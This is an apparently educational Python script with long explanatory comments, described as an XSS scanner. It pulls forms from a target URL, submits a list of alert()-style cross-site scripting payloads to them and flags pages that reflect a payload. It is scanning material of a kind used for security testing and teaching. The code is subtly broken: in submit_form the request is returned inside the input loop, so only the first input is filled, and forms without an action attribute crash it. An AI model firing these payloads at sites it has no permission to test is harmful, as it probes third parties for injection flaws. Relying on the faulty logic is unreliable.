
# XSS Scanner: Detecting Cross-Site Scripting Vulnerabilities.

import os, requests, colorama           # Library for clearing the terminal (OS); making HTTP requests (requests); adding colored text to the script (colorama).
from pprint import pprint               # Library for pretty-printing form details.
from bs4 import BeautifulSoup as bs     # Library for HTML parsing.
from urllib.parse import urljoin        # Library for constructing absolute URLs.

os.system("cls")                        # Command clearing the Terminal

def get_all_forms(url):                 # Function retrieves all HTML forms present on the target URL using the (requests) library, parses the content using the library (BeautifulSoup) and returns a list of form elements. Form elements are the various components used to collect input from users in grafical user interfaces (GUI) or web applications. These elements provide a way to interact with users and retrieve data such as text, numbers, selections and more.
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):                                         # Function takes a single form element as input and extracts relevent details such as action URL, HTTP method and input fields. It iterates over all input fields in the form and collects their type and name attributes. The function retuns a dictionary containing the form details.
    details = {}                                                    # Create an empty dictionary called 'details' to store the extracted form details.
    action = form.attrs.get("action").lower()                       # Retrieve the value of the 'action' attribute from the 'form' object and converts it to lowercase. The 'action' attribute specifies the URL where the form data should be submitted.
    method = form.attrs.get("method", "get").lower()                # Retrives the value of the 'method' attribute from the 'form' object and converts it to lowercase. The 'method' attribute specifies the HTTP method to be used for form submission. If the 'method' attribute is not found, it defaults to 'get'.
    inputs = []                                                     # Creates an empty list called 'inputs' to store the input details.
    for input_tag in form.find_all("input"):                        # From here code iterates through each 'input' tag found within the 'form' object usig 'form.find_all("input")'.
        input_type = input_tag.attrs.get("type", "text")            # Retrieves the value of the 'type' attribute from each input tag and assigns it to 'input_type'. If the 'type' attribute is not found, it defaults to 'text'.
        input_name = input_tag.attrs.get("name")                    # Retrieves the value of the 'name' attribute from each input tag and assigns it to 'input_name'.
        inputs.append({"type": input_type, "name": input_name})     # Creates a dictionary with keys 'type' and 'name' and appends it to the 'inputs' list. This dictionary represents the details of each input field, including its type and name.
    details["action"] = action                                      # The extracted form details are assigned to the 'details' dictionary: 'details["action"] = action', 'details["method"] = method', 'detais["inputs"] = inputs'.
    details["method"] = method
    details["inputs"] = inputs
    return details                                                  # Returns the 'details' as the output.

def submit_form(form_details, url, value):                          # The 'submit_from(from_details, url, value)' function submits a specific form with a user-defined payload value. It constructs the target URL using 'urljoin' and prepares the data to be sent in the request. It distinguishes between 'get' and 'post' methods and returns the response. Usually in the context of IT 'GET' and 'POST' are two commonly used HTTP methods for sending data between a client (typically a web browser) nd a server. THese methods define how the data is transmitted and handled by the server. 
                                                                    # The GET method is used to retrieve data from server. When a client sends a GET request, the data is appended to the URL in the form of query parameters. These parameters are visible in the URL, making them easily shareable and bookmarkable. The GET method is often used for retrieving web pages, fetching data from APIs or performing searches.
                                                                    # The POST method is used to submit data to sever for processing. Unlike the GET method, the data sent using POST is included in the body of the HTTP request, rather than in the URL. This makes it suitable for sending larger amounts of data or sensitive information that should not be exposed in the URL. The POST method is commonly used when submitting forms, making API requests that modify server-side data or uploading files.
    target_url = urljoin(url, form_details["action"])               # This line constructs the target URL by joining the base URL 'url' with the value of the 'action' attribute from 'form_details'. It uses the 'urljoin' function to handle relative URLs correctrly.
    inputs = form_details["inputs"]                                 # This line retrieves the list of input details from 'form_details'.
    data = {}                                                       # This line initializes an empty dictionary to store the form that data will be sent in the Http request.
    for input in inputs:                                            # In this loop code itertes through each input detail in the 'inputs' list using a 'for' loop.
        if input["type"] == "text" or input["type"] == "search":    # Check the type of each input by evaluating.
            input["value"] = value                                  # If the input type is either 'text' or 'search', the ode proceeds to update the input's value with provided 'value' argument.
            input_name = input.get("name")                          # It then retrieves the input's name and vlue respectivly.
            input_value = input.get("value")
            if input_name and input_value:                          # If both the input name and value exist,
                data[input_name] = input_value                      # the input data is added to the 'data' dictionary.
        if form_details["method"] == "post":                        # Here code checks the 'method' attribute of 'form_details' to determine if it is a POST or GET request.
            return requests.post(target_url, data=data)             # If the method is 'post', the code uses 'request.post()' function to send a POSt request to the 'target_url' with the form data contained in the 'data' dictionary.
        return requests.get(target_url, params=data)                # If the method is not 'post', the code assumes it is a GET request and uses the 'requests.get()' function to send a GET request to the 'target_url' with the form data appended as query parameters.
                                                                    # The function returns the response object from the HTTP request.

def scan_xss(url):                                                  # This function utilizes the previously dfined functions to scan for XSS vulnerabilities on the target URL. It starts by retrieving all forms on the URL. Then it itertes over each form, submits it with a crafted XSS payload and checks if the response contains the payload. If a vulnerability is detected, it prints the form details using 'pprint'.
    xss_payloads = [                                                # List of payloads contains various examples of XSS (Cross-Site Scripting)payloads. Each payload is a string representing a different method or technique that can be used to exploit XSS vulnerabilities.
        '<script>alert("XSS");</script>',
        '<img src="x" onerror="alert(\'XSS\');">',
        '<svg onload="alert(\'XSS\');"></svg>',
        '<a href="javascript:alert(\'XSS\');">Click me</a>',
        '<iframe src="javascript:alert(\'XSS\');"></iframe>',
        '<input type="text" value="XSS" autofocus onfocus="alert(\'XSS\');">',
        '<img src="x" srcset="x" onerror="javascript:alert(\'XSS\');">',
        '<svg><script>alert(\'XSS\');</script></svg>',
        '<a href="javascript:void(0)" onclick="alert(\'XSS\');">Click me</a>',
        '<img src=x:alert(1) onerror=eval(src)>',
        '<marquee loop="1" behavior="scroll" direction="left" onstart="alert(\'XSS\');">XSS</marquee>'
    ]
    forms = get_all_forms(url)                                              # This line calls the function named 'get_all_forms' to retrieve all the HTML forms present on the given URL. It assigns the list of forms to the 'forms' variable.
    print(f"[+] Detected {len(forms)} forms on {url}.")                     # This line prints the number of detected forms on the URL. It uses an f-string to format the output and includes the URL in the message.
    for form in forms:                                                      # Code enters a 'for' loop to iterate over each form in the 'forms' list.
        form_details = get_form_details(form)                               # Within the loop it calls a function named 'get_form_details' to extract details from each form. The resulting from details are assigned to the 'form_details' variable.
        for payload in xss_payloads:                                        # Another nested 'for' loop is used to iterate over each payload in an 'xss_payloads' list. This suggests that there is a predefined list of XSS payloads available for testing.
            response = submit_form(form_details, url, payload)              # Inside the inner loop it calls a function named 'submit_form' to submit the form with the urrent payload to the provided URL. The response from the server is assigned to the 'response' variable.
            if payload in response.content.decode():                        # The code then checks if the payload is present in the response content by decoding it to a string and using the 'in' operator.
                print(colorama.Fore.RED + f"[!] XSS Detected on {url}")     # If the payload is found in the response content, it indicates a potential XSS vulnerability. The code prints a warning message (thanks to colorama) using 'coloraama.Fore.RED' to disply the text in red, indicating a critical issue.
                print(colorama.Fore.YELLOW + f"[*] Form details:")          # It also prints the form details and uses 'colorama.Fore.YELLOW' to display the text in yellow.
                print(form_details)
                break                                                       # The loop is broken using the 'break' statement, assuming that once an XSS vulnerability is detected, there is no need to continue checking other payloads or forms.

if __name__ == "__main__":                                                  # Promt the user to enter the target URL. Then the 'scan_xss(url)' function is called and the results are displayed.
    colorama.init()
    url = input("Enter the target URL: ")
    scan_xss(url)
    colorama.deinit()
